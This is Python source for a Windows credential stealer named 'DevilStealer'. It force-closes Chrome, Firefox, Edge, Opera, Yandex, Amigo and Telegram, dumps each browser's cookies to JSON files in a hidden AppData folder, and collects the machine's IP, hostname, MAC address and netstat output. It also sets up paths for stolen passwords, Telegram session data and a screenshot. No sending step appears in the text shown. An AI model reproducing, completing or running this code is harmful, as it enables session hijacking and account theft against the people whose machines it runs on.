import browser_cookie3
import psutil
import shutil
import os
import json
import socket
import platform
import win32api
import uuid
import subprocess
from PIL import ImageGrab
import datetime
import zipfile

FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\screenshot.jpg"
ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"

hasProgram = {
    "chrome": True,
    "firefox": True,
    "yandex": True,
    "opera": True,
    "amigo": True,
    "edge": True,
    "telegram": True,
}


def create_folder():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)
    if not os.path.exists(FILE_COOKIE):
        os.makedirs(FILE_COOKIE)
    if not os.path.exists(FILE_TG):
        os.makedirs(FILE_TG)
    if not os.path.exists(FILE_PASSWORDS):
        os.makedirs(FILE_PASSWORDS)
    os.makedirs(FILE_TG, exist_ok=True)


def save_cookies(cookies, browser_name):
    if os.path.exists(FILE_PATH):
        if os.path.exists(FILE_COOKIE):
            filename = f"{FILE_COOKIE}/{browser_name}_cookies.json"
            with open(filename, "w") as file:
                formatted_cookies = [
                    {"name": cookie.name, "value": cookie.value, "domain": cookie.domain, "path": cookie.path,
                     "secure": cookie.secure, "expires": cookie.expires} for cookie in cookies]
                json.dump(formatted_cookies, file, indent=4)
        else:
            create_folder()
            save_cookies(cookies, browser_name)
    else:
        create_folder()
        save_cookies(cookies, browser_name)


def close_browser(browser_name):
    if browser_name == "chrome":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'chrome.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "firefox":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'firefox.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "opera":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'opera.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "yandex":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'browser.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "amigo":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'browser.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "edge":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'msedge.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "tg":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'Telegram.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass


def yandex_cookie():
    try:
        close_browser("yandex")
        cookies = browser_cookie3.yandex()
        save_cookies(cookies, "yandex")
    except:
        save_cookies([], "yandex_error")
        hasProgram['yandex'] = False


def chrome_cookie():
    try:
        close_browser("chrome")
        cookies = browser_cookie3.chrome()
        save_cookies(cookies, "chrome")
    except:
        save_cookies([], "chrome_error")
        hasProgram['chrome'] = False


def firefox_cookie():
    try:
        close_browser("firefox")
        cookies = browser_cookie3.firefox()
        save_cookies(cookies, "firefox")
    except:
        save_cookies([], "firefox_error")
        hasProgram['firefox'] = False


def opera_cookie():
    try:
        close_browser("opera")
        cookies = browser_cookie3.opera()
        save_cookies(cookies, "opera")
    except:
        save_cookies([], "opera_error")
        hasProgram['opera'] = False


def amigo_cookie():
    try:
        close_browser("amigo")
        cookies = browser_cookie3.amigo()
        save_cookies(cookies, "amigo")
    except:
        save_cookies([], "amigo_error")
        hasProgram['amigo'] = False


def edge_cookie():
    try:
        close_browser("edge")
        cookies = browser_cookie3.edge()
        save_cookies(cookies, "edge")
    except:
        save_cookies([], "edge_error")
        hasProgram['edge'] = False


def getip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address


def gethostname():
    hostname = socket.gethostname()
    return hostname


def get_mac_address():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e + 2] for e in range(0, 12, 2)])


def get_network_connections():
    try:
        result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            return result.stdout.encode('utf-8', errors='ignore').decode('utf-8')
        else:
            return f"Error executing netstat: {result.stderr}"
    except Exception as e:
        return f"An error occurred: {e}"


